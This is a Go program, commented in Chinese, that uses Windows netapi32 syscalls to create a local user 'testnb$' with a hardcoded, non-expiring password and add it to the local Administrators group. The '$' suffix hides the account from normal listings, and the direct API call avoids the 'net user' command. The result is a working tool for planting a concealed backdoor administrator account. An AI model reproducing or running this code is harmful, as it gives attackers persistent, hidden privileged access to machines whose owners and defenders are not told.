package main

import (
	"fmt"
	"os"
	"syscall"
	"unsafe"
)

//参考如下
//https://docs.microsoft.com/zh-cn/windows/win32/api/lmaccess/nf-lmaccess-netuseradd/
//https://github.com/CodyGuo/xcgui/blob/master/doc/cToGo.go
//https://github.com/iamacarpet/go-win64api/blob/master/users.go
//https://git.itch.ovh/itchio/ox/-/blob/ec75be15423d72ab9691a3318ecce3feee67b19b/syscallex/netapi32_windows.go
//https://pkg.go.dev/github.com/itchio/ox/syscallex#NetUserAdd
type USER_INFO_1 struct {
	Usri1_name         *uint16
	Usri1_password     *uint16
	Usri1_password_age uint32 //可忽略
	Usri1_priv         uint32
	Usri1_home_dir     *uint16
	Usri1_comment      *uint16
	Usri1_flags        uint32
	Usri1_script_path  *uint16
}
type LOCALGROUP_MEMBERS_INFO_3 struct {
	Lgrmi3_domainandname *uint16
}

const (
	USER_PRIV_GUEST            = 0
	USER_PRIV_USER             = 1
	USER_PRIV_ADMIN            = 2
	USER_UF_SCRIPT             = 1
	USER_UF_NORMAL_ACCOUNT     = 512
	USER_UF_DONT_EXPIRE_PASSWD = 65536
	//parmErr                     = 0
	NET_API_STATUS_NERR_Success = 0
)

type User struct {
	username string
	password string
}

func main() {
	// 请更改此处用户名密码
	info := User{
		username: "testnb$",
		password: "123@pass",
	}

	r, err := NetUserAdd(info.username, info.password)
	if err != nil {
		fmt.Println(err)
	}
	fmt.Println(r)
	//if r == true {
	//	_, err := AddLocalGroup("test", "Administrators")
	//	if err != nil {
	//		fmt.Println(err)
	//	}
	//}
}

func NetUserAdd(user string, pass string) (bool, error) {
	var parmErr uint32
	parmErr = uint32(0)

	username := UtfToStr(user)
	password := UtfToStr(pass)
	userinfo := USER_INFO_1{
		Usri1_name:     username,
		Usri1_password: password,
		Usri1_priv:     USER_PRIV_USER,
		Usri1_flags:    USER_UF_SCRIPT | USER_UF_NORMAL_ACCOUNT | USER_UF_DONT_EXPIRE_PASSWD,
		//Usri1_home_dir:    UtfToStr(""),
		//Usri1_comment:     UtfToStr("test测试用户"),
		//Usri1_script_path: UtfToStr(""),
	}

	netapi, err := syscall.LoadLibrary("netapi32.dll")
	if err != nil {
		panic("dll引用失败")
	}
	AddUser, err := syscall.GetProcAddress(netapi, "NetUserAdd")
	result, _, _ := syscall.Syscall6(AddUser,
		4,
		uintptr(0),         //server
		uintptr(uint32(1)), //lever
		uintptr(unsafe.Pointer(&userinfo)),
		uintptr(unsafe.Pointer(&parmErr)), 0, 0,
	)
	//令必须使用管理员权限才能添加用户
	if result != NET_API_STATUS_NERR_Success {
		return false, fmt.Errorf("添加失败")
	} else {
		_, err = AddLocalGroup(user, "Administrators", netapi)
		if err != nil {
			fmt.Println(err)
		}
		return true, fmt.Errorf("添加成功%s:%s", user, pass)

	}

}

func AddLocalGroup(user, group string, netapi syscall.Handle) (bool, error) {
	work, _ := os.Hostname()
	WorkStation := UtfToStr(work + `\` + user)
	GroupName := UtfToStr(group)
	var uArray = make([]LOCALGROUP_MEMBERS_INFO_3, 1)
	uArray[0] = LOCALGROUP_MEMBERS_INFO_3{
		Lgrmi3_domainandname: WorkStation,
	}
	ALG, _ := syscall.GetProcAddress(netapi, "NetLocalGroupAddMembers")
	result, _, _ := syscall.Syscall6(ALG, 5,
		uintptr(0),                          // servername
		uintptr(unsafe.Pointer(GroupName)),  // group name
		uintptr(uint32(3)),                  // level
		uintptr(unsafe.Pointer(&uArray[0])), // user array.
		uintptr(uint32(len(uArray))), 0)
	if result != NET_API_STATUS_NERR_Success {
		return false, fmt.Errorf("添加管理组失败")
	} else {
		return true, fmt.Errorf("添加管理组Administrators成功")
	}
}
func UtfToStr(str string) *uint16 {
	res, err := syscall.UTF16PtrFromString(str)
	if err != nil {
		panic(err)
	}
	return res
}
